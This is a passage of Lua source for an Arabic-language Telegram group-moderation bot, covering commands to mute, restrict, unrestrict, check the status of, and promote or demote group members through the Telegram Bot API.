end;end,nil)
return false
end
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
if text == 'مسح المقيدين' and ChanSub(msg) and Mod(msg) then
local List = database:smembers(bot_id..'Tkeed:User'..msg.chat_id_)
for k,v in pairs(List) do   
https.request("https://api.telegram.org/bot"..token.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..v.."&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True") 
database:del(bot_id..'Tkeed:User'..msg.chat_id_, v)
end 
send(msg.chat_id_, msg.id_, '✯︙تم مسح المقيدين')
end
if text == ("المقيدين") and ChanSub(msg) and Mod(msg) then
local list = database:smembers(bot_id..'Tkeed:User'..msg.chat_id_)
t = "\n✯︙قائمة المقيدين \nٴ≪━━━━ 𝐖𝐀𝐓𝐀𝐍 ━━━━≫ٴ\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."- ([@"..username.."])\n"
else
t = t..""..k.."- (`"..v.."`)\n"
end
end
if #list == 0 then
t = " ✯︙لا يوجد مقيدين"
end
send(msg.chat_id_, msg.id_, t)
end
if text == 'مسح المكتومين' and ChanSub(msg) and Mod(msg) then
database:del(bot_id..'Muted:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, '✯︙تم مسح المكتومين')
end
if text == ("المكتومين") and ChanSub(msg) and Mod(msg) then
local list = database:smembers(bot_id..'Muted:User'..msg.chat_id_)
t = "\n✯︙قائمة المكتومين \nٴ≪━━━━ 𝐖𝐀𝐓𝐀𝐍 ━━━━≫ٴ\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."- ([@"..username.."])\n"
else
t = t..""..k.."- (`"..v.."`)\n"
end
end
if #list == 0 then
t = " ✯︙لا يوجد مكتومين"
end
send(msg.chat_id_, msg.id_, t)
end

if text == ("كتم") and ChanSub(msg) and msg.reply_to_message_id_ ~= 0 and Mod(msg) then
function start_function(extra, result, success)
if tonumber(result.sender_user_id_) == tonumber(bot_id) then  
send(msg.chat_id_, msg.id_, " ✯︙لا تسطيع كتم البوت ")
return false 
end
if Can_or_NotCan(result.sender_user_id_, msg.chat_id_) == true then
send(msg.chat_id_, msg.id_, '\n✯︙عذرا لا تستطيع كتم ( '..Rutba(result.sender_user_id_,msg.chat_id_)..' )')
else
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,'✯︙البوت ليس ادمن يرجى ترقيتي !') 
return false  
end
database:sadd(bot_id..'Muted:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n✯︙العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'WaTaNTeaM')..')'
status  = '\n✯︙تم كتمه'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
if text and text:match("^كتم @(.*)$") and ChanSub(msg) and Mod(msg) then
local username = text:match("^كتم @(.*)$")
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,'✯︙البوت ليس ادمن يرجى ترقيتي !') 
return false  
end
function start_function(extra, result, success)
if result.id_ then
if tonumber(result.id_) == tonumber(bot_id) then  
send(msg.chat_id_, msg.id_, " ✯︙لا تسطيع كتم البوت ")
return false 
end
if Can_or_NotCan(result.id_, msg.chat_id_) == true then
send(msg.chat_id_, msg.id_, '\n✯︙عذرا لا تستطيع كتم ( '..Rutba(result.id_,msg.chat_id_)..' )')
else
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_," ✯︙عذرا عزيزي المستخدم هذا معرف قناة يرجى استخدام الامر بصوره صحيحه !")   
return false 
end      
database:sadd(bot_id..'Muted:User'..msg.chat_id_, result.id_)
usertext = '\n✯︙العضو » ['..result.title_..'](t.me/'..(username or 'WaTaNTeaM')..')'
status  = '\n✯︙تم كتمه'
texts = usertext..status
send(msg.chat_id_, msg.id_, texts)
end
else
send(msg.chat_id_, msg.id_, '✯︙لا يوجد حساب بهذا المعرف')
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end
if text and text:match('^كتم (%d+) (.*)$') and ChanSub(msg) and tonumber(msg.reply_to_message_id_) ~= 0 and Mod(msg) then
local TextEnd = {string.match(text, "^(كتم) (%d+) (.*)$")}
function start_function(extra, result, success)
if TextEnd[3] == 'يوم' then
Time_Restrict = TextEnd[2]:match('(%d+)')
Time = Time_Restrict * 86400
end
if TextEnd[3] == 'ساعه' then
Time_Restrict = TextEnd[2]:match('(%d+)')
Time = Time_Restrict * 3600
end
if TextEnd[3] == 'دقيقه' then
Time_Restrict = TextEnd[2]:match('(%d+)')
Time = Time_Restrict * 60
end
TextEnd[3] = TextEnd[3]:gsub('دقيقه',"دقايق") 
TextEnd[3] = TextEnd[3]:gsub('ساعه',"ساعات") 
TextEnd[3] = TextEnd[3]:gsub("يوم","ايام") 
if Can_or_NotCan(result.sender_user_id_, msg.chat_id_) then
send(msg.chat_id_, msg.id_, "\n✯︙عذرا لا تستطيع كتم ( "..Rutba(result.sender_user_id_,msg.chat_id_).." )")
else
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n✯︙العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'WaTaNTeaM')..')'
status  = '\n✯︙تم كتم لمدة ~ { '..TextEnd[2]..' '..TextEnd[3]..'}'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
https.request("https://api.telegram.org/bot"..token.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..result.sender_user_id_..'&until_date='..tonumber(msg.date_+Time))
end
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end


if text and text:match('^كتم (%d+) (.*) @(.*)$') and ChanSub(msg) and Mod(msg) then
local TextEnd = {string.match(text, "^(كتم) (%d+) (.*) @(.*)$")}
function start_function(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_," ✯︙عذرا عزيزي المستخدم هذا معرف قناة يرجى استخدام الامر بصوره صحيحه !")   
return false 
end      
if TextEnd[3] == 'يوم' then
Time_Restrict = TextEnd[2]:match('(%d+)')
Time = Time_Restrict * 86400
end
if TextEnd[3] == 'ساعه' then
Time_Restrict = TextEnd[2]:match('(%d+)')
Time = Time_Restrict * 3600
end
if TextEnd[3] == 'دقيقه' then
Time_Restrict = TextEnd[2]:match('(%d+)')
Time = Time_Restrict * 60
end
TextEnd[3] = TextEnd[3]:gsub('دقيقه',"دقايق") 
TextEnd[3] = TextEnd[3]:gsub('ساعه',"ساعات") 
TextEnd[3] = TextEnd[3]:gsub("يوم","ايام") 
if Can_or_NotCan(result.id_, msg.chat_id_) then
send(msg.chat_id_, msg.id_, "\n✯︙عذرا لا تستطيع كتم ( "..Rutba(result.id_,msg.chat_id_).." )")
else
usertext = '\n✯︙العضو » ['..result.title_..'](t.me/'..(username or 'WaTaNTeaM')..')'
status  = '\n✯︙تم كتم لمدة ~ { '..TextEnd[2]..' '..TextEnd[3]..'}'
texts = usertext..status
send(msg.chat_id_, msg.id_,texts)
https.request("https://api.telegram.org/bot"..token.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..result.id_..'&until_date='..tonumber(msg.date_+Time))
end
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = TextEnd[4]}, start_function, nil)
return false
end
if text and text:match("^كتم (%d+)$") and ChanSub(msg) and Mod(msg) then
local userid = text:match("^كتم (%d+)$")
if tonumber(userid) == tonumber(bot_id) then  
send(msg.chat_id_, msg.id_, " ✯︙لا تسطيع كتم البوت ")
return false 
end
if Can_or_NotCan(userid, msg.chat_id_) == true then
send(msg.chat_id_, msg.id_, '\n✯︙عذرا لا تستطيع كتم ( '..Rutba(userid,msg.chat_id_)..' )')
else
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,'✯︙البوت ليس ادمن يرجى ترقيتي !') 
return false  
end
database:sadd(bot_id..'Muted:User'..msg.chat_id_, userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n✯︙العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'WaTaNTeaM')..')'
status  = '\n✯︙تم كتمه'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n✯︙العضو » '..userid..''
status  = '\n✯︙تم كتمه'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
end
return false
end
if text == ("الغاء كتم") and ChanSub(msg) and msg.reply_to_message_id_ and Mod(msg) then
function start_function(extra, result, success)
database:srem(bot_id..'Muted:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n✯︙العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'WaTaNTeaM')..')'
status  = '\n✯︙تم الغاء كتمه'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
if text and text:match("^الغاء كتم @(.*)$") and ChanSub(msg) and Mod(msg) then
local username = text:match("^الغاء كتم @(.*)$")
function start_function(extra, result, success)
if result.id_ then
database:srem(bot_id..'Muted:User'..msg.chat_id_, result.id_)
usertext = '\n✯︙العضو » ['..result.title_..'](t.me/'..(username or 'WaTaNTeaM')..')'
status  = '\n✯︙تم الغاء كتمه'
texts = usertext..status
else
texts = '✯︙لا يوجد حساب بهذا المعرف'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end

if text and text:match("^الغاء كتم (%d+)$") and ChanSub(msg) and Mod(msg) then
local userid = text:match("^الغاء كتم (%d+)$") 
database:srem(bot_id..'Muted:User'..msg.chat_id_, userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n✯︙العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'WaTaNTeaM')..')'
status  = '\n✯︙تم الغاء كتمه'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n✯︙العضو » '..userid..''
status  = '\n✯︙تم الغاء كتمه'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
return false
end

if text == ("تقيد") and ChanSub(msg) and msg.reply_to_message_id_ and Mod(msg) then
function start_function(extra, result, success)
if tonumber(result.sender_user_id_) == tonumber(bot_id) then  
send(msg.chat_id_, msg.id_, " ✯︙لا تسطيع تقيد البوت ")
return false 
end
if Can_or_NotCan(result.sender_user_id_, msg.chat_id_) then
send(msg.chat_id_, msg.id_, '\n✯︙عذرا لا تستطيع تقيد ( '..Rutba(result.sender_user_id_,msg.chat_id_)..' )')
else
https.request("https://api.telegram.org/bot"..token.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..result.sender_user_id_)
database:sadd(bot_id..'Tkeed:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n✯︙العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'WaTaNTeaM')..')'
status  = '\n✯︙تم تقيده'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
if text and text:match("^تقيد @(.*)$") and ChanSub(msg) and Mod(msg) then
local username = text:match("^تقيد @(.*)$")
function start_function(extra, result, success)
if result.id_ then
if tonumber(result.id_) == tonumber(bot_id) then  
send(msg.chat_id_, msg.id_, " ✯︙لا تسطيع تقيد البوت ")
return false 
end
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_," ✯︙عذرا عزيزي المستخدم هذا معرف قناة يرجى استخدام الامر بصوره صحيحه !")   
return false 
end      
if Can_or_NotCan(result.id_, msg.chat_id_) then
send(msg.chat_id_, msg.id_, '\n✯︙عذرا لا تستطيع تقيد ( '..Rutba(result.id_,msg.chat_id_)..' )')
return false 
end      
https.request("https://api.telegram.org/bot"..token.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..result.id_)
database:sadd(bot_id..'Tkeed:User'..msg.chat_id_, result.id_)
usertext = '\n✯︙العضو » ['..result.title_..'](t.me/'..(username or 'WaTaNTeaM')..')'
status  = '\n✯︙تم تقيده'
texts = usertext..status
else
texts = '✯︙لا يوجد حساب بهذا المعرف'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end

if text and text:match('^تقيد (%d+) (.*)$') and ChanSub(msg) and tonumber(msg.reply_to_message_id_) ~= 0 and Mod(msg) then
local TextEnd = {string.match(text, "^(تقيد) (%d+) (.*)$")}
function start_function(extra, result, success)
if TextEnd[3] == 'يوم' then
Time_Restrict = TextEnd[2]:match('(%d+)')
Time = Time_Restrict * 86400
end
if TextEnd[3] == 'ساعه' then
Time_Restrict = TextEnd[2]:match('(%d+)')
Time = Time_Restrict * 3600
end
if TextEnd[3] == 'دقيقه' then
Time_Restrict = TextEnd[2]:match('(%d+)')
Time = Time_Restrict * 60
end
TextEnd[3] = TextEnd[3]:gsub('دقيقه',"دقايق") 
TextEnd[3] = TextEnd[3]:gsub('ساعه',"ساعات") 
TextEnd[3] = TextEnd[3]:gsub("يوم","ايام") 
if Can_or_NotCan(result.sender_user_id_, msg.chat_id_) then
send(msg.chat_id_, msg.id_, "\n✯︙عذرا لا تستطيع تقيد ( "..Rutba(result.sender_user_id_,msg.chat_id_).." )")
else
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n✯︙العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'WaTaNTeaM')..')'
status  = '\n✯︙تم تقيده لمدة ~ { '..TextEnd[2]..' '..TextEnd[3]..'}'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
https.request("https://api.telegram.org/bot"..token.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..result.sender_user_id_..'&until_date='..tonumber(msg.date_+Time))
end
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end


if text and text:match('^تقيد (%d+) (.*) @(.*)$') and ChanSub(msg) and Mod(msg) then
local TextEnd = {string.match(text, "^(تقيد) (%d+) (.*) @(.*)$")}
function start_function(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_," ✯︙عذرا عزيزي المستخدم هذا معرف قناة يرجى استخدام الامر بصوره صحيحه !")   
return false 
end      
if TextEnd[3] == 'يوم' then
Time_Restrict = TextEnd[2]:match('(%d+)')
Time = Time_Restrict * 86400
end
if TextEnd[3] == 'ساعه' then
Time_Restrict = TextEnd[2]:match('(%d+)')
Time = Time_Restrict * 3600
end
if TextEnd[3] == 'دقيقه' then
Time_Restrict = TextEnd[2]:match('(%d+)')
Time = Time_Restrict * 60
end
TextEnd[3] = TextEnd[3]:gsub('دقيقه',"دقايق") 
TextEnd[3] = TextEnd[3]:gsub('ساعه',"ساعات") 
TextEnd[3] = TextEnd[3]:gsub("يوم","ايام") 
if Can_or_NotCan(result.id_, msg.chat_id_) then
send(msg.chat_id_, msg.id_, "\n✯︙عذرا لا تستطيع تقيد ( "..Rutba(result.id_,msg.chat_id_).." )")
else
usertext = '\n✯︙العضو » ['..result.title_..'](t.me/'..(username or 'WaTaNTeaM')..')'
status  = '\n✯︙تم تقيده لمدة ~ { '..TextEnd[2]..' '..TextEnd[3]..'}'
texts = usertext..status
send(msg.chat_id_, msg.id_,texts)
https.request("https://api.telegram.org/bot"..token.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..result.id_..'&until_date='..tonumber(msg.date_+Time))
end
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = TextEnd[4]}, start_function, nil)
return false
end
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
if text and text:match("^تقيد (%d+)$") and ChanSub(msg) and Mod(msg) then
local userid = text:match("^تقيد (%d+)$")
if tonumber(userid) == tonumber(bot_id) then  
send(msg.chat_id_, msg.id_, " ✯︙لا تسطيع تقيد البوت ")
return false 
end
if Can_or_NotCan(userid, msg.chat_id_) then
send(msg.chat_id_, msg.id_, '\n✯︙عذرا لا تستطيع تقيد ( '..Rutba(userid,msg.chat_id_)..' )')
else
https.request("https://api.telegram.org/bot" .. token .. "/restrictChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..userid)
database:sadd(bot_id..'Tkeed:User'..msg.chat_id_, userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n✯︙العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'WaTaNTeaM')..')'
status  = '\n✯︙تم تقيده'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n✯︙العضو » '..userid..''
status  = '\n✯︙تم تقيده'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
end
return false
end
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
if text == ("الغاء تقيد") and ChanSub(msg) and msg.reply_to_message_id_ and Mod(msg) then
function start_function(extra, result, success)
https.request("https://api.telegram.org/bot" .. token .. "/restrictChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" .. result.sender_user_id_ .. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")
database:srem(bot_id..'Tkeed:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n✯︙العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'WaTaNTeaM')..')'
status  = '\n✯︙تم الغاء تقيد'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
if text and text:match("^الغاء تقيد @(.*)$") and ChanSub(msg) and Mod(msg) then
local username = text:match("^الغاء تقيد @(.*)$")
function start_function(extra, result, success)
if result.id_ then
https.request("https://api.telegram.org/bot" .. token .. "/restrictChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" .. result.id_ .. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")
database:srem(bot_id..'Tkeed:User'..msg.chat_id_, result.id_)
usertext = '\n✯︙العضو » ['..result.title_..'](t.me/'..(username or 'WaTaNTeaM')..')'
status  = '\n✯︙تم الغاء تقيد'
texts = usertext..status
else
texts = '✯︙لا يوجد حساب بهذا المعرف'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
if text and text:match("^الغاء تقيد (%d+)$") and ChanSub(msg) and Mod(msg) then
local userid = text:match("^الغاء تقيد (%d+)$")
https.request("https://api.telegram.org/bot" .. token .. "/restrictChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..userid.. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")
database:srem(bot_id..'Tkeed:User'..msg.chat_id_, userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n✯︙العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'WaTaNTeaM')..')'
status  = '\n✯︙تم الغاء تقيد'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n✯︙العضو » '..userid..''
status  = '\n✯︙تم الغاء تقيد'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
return false
end
if text and text:match('^رفع القيود @(.*)') and ChanSub(msg) and Manager(msg) then 
local username = text:match('^رفع القيود @(.*)') 
function start_function(extra, result, success)
if result.id_ then
if DevWaTaN(msg) then
database:srem(bot_id..'GBan:User',result.id_)
database:srem(bot_id..'Ban:User'..msg.chat_id_,result.id_)
database:srem(bot_id..'Muted:User'..msg.chat_id_,result.id_)
database:srem(bot_id..'Tkeed:User'..msg.chat_id_,result.id_)
database:srem(bot_id..'Gmute:User'..msg.chat_id_,result.id_)
usertext = '\n✯︙العضو » ['..result.title_..'](t.me/'..(username or 'WaTaNTeaM')..')'
status  = '\n✯︙تم الغاء جميع القيود'
texts = usertext..status
send(msg.chat_id_, msg.id_,texts)
else
database:srem(bot_id..'Ban:User'..msg.chat_id_,result.id_)
database:srem(bot_id..'Muted:User'..msg.chat_id_,result.id_)
database:srem(bot_id..'Tkeed:User'..msg.chat_id_,result.id_)
usertext = '\n✯︙العضو » ['..result.title_..'](t.me/'..(username or 'WaTaNTeaM')..')'
status  = '\n✯︙تم الغاء جميع القيود'
texts = usertext..status
send(msg.chat_id_, msg.id_,texts)
end
else
Text = '✯︙المعرف غلط'
send(msg.chat_id_, msg.id_,Text)
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
end
if text == "رفع القيود" and ChanSub(msg) and Manager(msg) then
function start_function(extra, result, success)
if DevWaTaN(msg) then
database:srem(bot_id..'GBan:User',result.sender_user_id_)
database:srem(bot_id..'Ban:User'..msg.chat_id_,result.sender_user_id_)
database:srem(bot_id..'Muted:User'..msg.chat_id_,result.sender_user_id_)
database:srem(bot_id..'Tkeed:User'..msg.chat_id_,result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n✯︙العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'WaTaNTeaM')..')'
status  = '\n✯︙تم الغاء جميع القيود'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
else
database:srem(bot_id..'Ban:User'..msg.chat_id_,result.sender_user_id_)
database:srem(bot_id..'Muted:User'..msg.chat_id_,result.sender_user_id_)
database:srem(bot_id..'Tkeed:User'..msg.chat_id_,result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n✯︙العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'WaTaNTeaM')..')'
status  = '\n✯︙تم الغاء جميع القيود'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
end
if text and text:match('^كشف القيود @(.*)') and ChanSub(msg) and Manager(msg) then 
local username = text:match('^كشف القيود @(.*)') 
function start_function(extra, result, success)
if result.id_ then
if database:sismember(bot_id..'Muted:User'..msg.chat_id_,result.id_) then
Muted = 'مكتوم'
else
Muted = 'غير مكتوم'
end
if database:sismember(bot_id..'Tkeed:User'..msg.chat_id_,result.id_) then
Tkeed = 'مقيد'
else
Tkeed = 'غير مقيد'
end
if database:sismember(bot_id..'Ban:User'..msg.chat_id_,result.id_) then
Ban = 'محظور'
else
Ban = 'غير محظور'
end
if database:sismember(bot_id..'GBan:User',result.id_) then
GBan = 'محظور عام'
else
GBan = 'غير محظور عام'
end
Textt = " ✯︙الحظر العام » "..GBan.."\n✯︙الحظر » "..Ban.."\n✯︙الكتم » "..Muted.."\n✯︙التقيد » "..Tkeed..""
send(msg.chat_id_, msg.id_,Textt)
else
Text = '✯︙المعرف غلط'
send(msg.chat_id_, msg.id_,Text)
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
end

if text == "كشف القيود" and ChanSub(msg) and Manager(msg) then 
function start_function(extra, result, success)
if database:sismember(bot_id..'Muted:User'..msg.chat_id_,result.sender_user_id_) then
Muted = 'مكتوم'
else
Muted = 'غير مكتوم'
end
if database:sismember(bot_id..'Tkeed:User'..msg.chat_id_,result.sender_user_id_) then
Tkeed = 'مقيد'
else
Tkeed = 'غير مقيد'
end
if database:sismember(bot_id..'Ban:User'..msg.chat_id_,result.sender_user_id_) then
Ban = 'محظور'
else
Ban = 'غير محظور'
end
if database:sismember(bot_id..'GBan:User',result.sender_user_id_) then
GBan = 'محظور عام'
else
GBan = 'غير محظور عام'
end
if database:sismember(bot_id..'Gmute:User',result.sender_user_id_) then
Gmute = 'محظور عام'
else
Gmute = 'غير محظور عام'
end
Textt = " ✯︙الحظر العام » "..GBan.."\n✯︙الكتم العام » "..Gmute.."\n✯︙الحظر » "..Ban.."\n✯︙الكتم » "..Muted.."\n✯︙التقيد » "..Tkeed..""
send(msg.chat_id_, msg.id_,Textt)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
end
if text == ("رفع ادمن بالكروب") and ChanSub(msg) and msg.reply_to_message_id_ ~= 0 and Constructor(msg) then
function start_function(extra, result, success)
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,'✯︙لا امتلك صلاحية اضافة مشرفين يرجى ترقيتي !') 
return false  
end
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n✯︙العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'BO6OK')..')'
status  = '\n✯︙الايدي » `'..result.sender_user_id_..'`\n✯︙تم رفعه ادمن بالكروب '
send(msg.chat_id_, msg.id_, usertext..status)
https.request("https://api.telegram.org/bot"..token.."/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.sender_user_id_.."&can_change_info=false&can_delete_messages=false&can_invite_users=True&can_restrict_members=false&can_pin_messages=True&can_promote_members=false")
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
if text and text:match("^رفع ادمن بالكروب @(.*)$") and ChanSub(msg) and Constructor(msg) then
local username = text:match("^رفع ادمن بالكروب @(.*)$")
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,'✯︙لا امتلك صلاحية اضافة مشرفين يرجى ترقيتي !') 
return false  
end
function start_function(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_," ✯︙عذرا عزيزي المستخدم هذا معرف قناة يرجى استخدام الامر بصوره صحيحه !")   
return false 
end      
usertext = '\n✯︙العضو » ['..result.title_..'](t.me/'..(username or 'BO6OK')..')'
status  = '\n✯︙تم رفعه ادمن بالكروب '
texts = usertext..status
send(msg.chat_id_, msg.id_, texts)
https.request("https://api.telegram.org/bot"..token.."/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.id_.."&can_change_info=false&can_delete_messages=false&can_invite_users=True&can_restrict_members=false&can_pin_messages=True&can_promote_members=false")
else
send(msg.chat_id_, msg.id_, '✯︙لا يوجد حساب بهذا المعرف')
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end
if text == ("تنزيل ادمن بالكروب") and ChanSub(msg) and msg.reply_to_message_id_ ~= 0 and Constructor(msg) then
function start_function(extra, result, success)
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,'✯︙لا امتلك صلاحية ازالة مشرفين يرجى ترقيتي !') 
return false  
end
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n✯︙العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'BO6OK')..')'
status  = '\n✯︙الايدي » `'..result.sender_user_id_..'`\n✯︙تم تنزيله ادمن من الكروب'
send(msg.chat_id_, msg.id_, usertext..status)
https.request("https://api.telegram.org/bot"..token.."/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.sender_user_id_.."&can_change_info=false&can_delete_messages=false&can_invite_users=false&can_restrict_members=false&can_pin_messages=false&can_promote_members=false")
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
if text and text:match("^تنزيل ادمن بالكروب @(.*)$") and ChanSub(msg) and Constructor(msg) then
local username = text:match("^تنزيل ادمن بالكروب @(.*)$")
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,'✯︙لا امتلك صلاحية ازالة مشرفين يرجى ترقيتي !') 
return false  
end
function start_function(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_," ✯︙عذرا عزيزي المستخدم هذا معرف قناة يرجى استخدام الامر بصوره صحيحه !")   
return false 
end      
usertext = '\n✯︙العضو » ['..result.title_..'](t.me/'..(username or 'BO6OK')..')'
status  = '\n✯︙تم تنزيله ادمن من الكروب'
texts = usertext..status
